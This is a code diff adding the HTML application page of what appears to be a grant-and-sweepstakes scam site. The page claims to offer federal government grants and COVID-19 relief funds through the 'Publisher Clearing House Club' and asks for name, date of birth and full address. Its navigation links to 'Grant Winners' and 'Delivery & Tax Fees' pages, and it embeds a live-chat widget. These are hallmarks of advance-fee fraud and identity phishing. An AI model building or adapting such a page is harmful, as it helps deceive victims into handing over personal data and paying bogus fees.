@@ -1,0 +1,141 @@
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>(FGGCF - PCH) - APPLY NOW</title>
+    <link rel="shortcut icon" href="image/logoo.png" type="image/x-icon">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+
+    <section>
+    <nav class="navbar navbar-expand-lg navbar-inverse bg-dark navbar-dark px-5">
+        <div class="container-fluid">
+          <a class="navbar-brand" href="index.html">
+            <img src="./image/logoo.png" alt="" width="50px" height="20px">
+            (FGGCF - PCH)
+          </a>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+          <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+            <ul class="navbar-nav">
+              <li class="nav-item">
+                <a class="nav-link" href="index.html">HOME</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link active" aria-current="page" href="apply-now.html">APPLY NOW</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="grant-winners.html">GRANT WINNERS</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="delivery-tax-fees.html">DELIVERY & TAX FEES</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="faq.html">FAQ</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </nav>
+    </section>
+
+    <section>
+      <div class="">
+        <div class="bg_apply">
+          <div class="container">
+            <p class="py-5 text-center">
+              <h2 class="mb-4" style="color: #fff; font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;">
+                APPLY NOW FOR <BR><span class="text-warning">FEDERAL GOVERNMENT GRANT AND COVID19 RELIEF FUNDS</span>
+              </h2>
+              <h2 class="mb-4 h-middle fst-italic" style="color: #fff; font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;">
+                AND
+              </h2>
+              <h2 style="color: #fff; font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;">
+              <span class="text-warning">PUBLISHER CLEARING HOUSE CLUB</span><br><br><br>
+              </h2>
+            </p>
+          </div>
+         </div>
+      </div>
+    </section>
+
+
+    <form id="step1-form" align="center">
+      <h3 class="form-h3">APPLICATION FORM</h3>
+      <div class="form-container">
+        <div class="form-field">
+          <label for="firstName">First Name:</label>
+          <input type="text" id="firstName" name="firstName" value="" required>
+        </div>
+        <div class="form-field">
+          <label for="lastName">Last Name:</label>
+          <input type="text" id="lastName" name="lastName" value="" required>
+        </div>
+        <div class="form-field">
+          <label for="dob">Date of Birth</label>
+          <input type="date" id="dob" name="dob" value="" required>
+        </div>
+        <div class="form-field">
+          <label for="streetAdrress">Street Address</label>
+          <input type="text" id="streetAdrress" name="streetAdrress" value="" required>
+        </div>
+        <div class="form-field">
+          <label for="city">City:</label>
+          <input type="text" id="city" name="city" value="" required>
+        </div>
+        <div class="form-field">
+          <label for="state">State:</label>
+          <input type="text" id="state" name="state" value="" required>
+        </div>
+        <div class="form-field">
+          <label for="zipCode">Zip Code:</label>
+          <input type="tel" id="zipCode" name="zipCode" value="">
+        </div>
+
+        <a href="step2.html"><button type="button" class="w-50 btn btn-lg btn-outline-dark">Next</button></a>
+
+        <div id="nextStepFields" style="display: none;">
+
+        </div>
+      </div>
+        <div class="form-field">
+
+        </div>
+        <div class="form-field">
+
+        </div>
+        <div class="form-field">
+
+        </div>
+
+
+
+
+
+
+    </form>
+
+
+
+
+    <script>
+      function nextStep () {
+        var formData = new
+        FormData(document.getElementById('step1-form'));
+        var xhr = new XMLHttpRequest ();
+        xhr.open('POST', 'step2.html', true);
+        xhr.send(formData);
+      }
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js" integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy" crossorigin="anonymous"></script>
+</body>
+
+<script src="//code.jivosite.com/widget/v8rdIIXicC" async></script>
+</html>
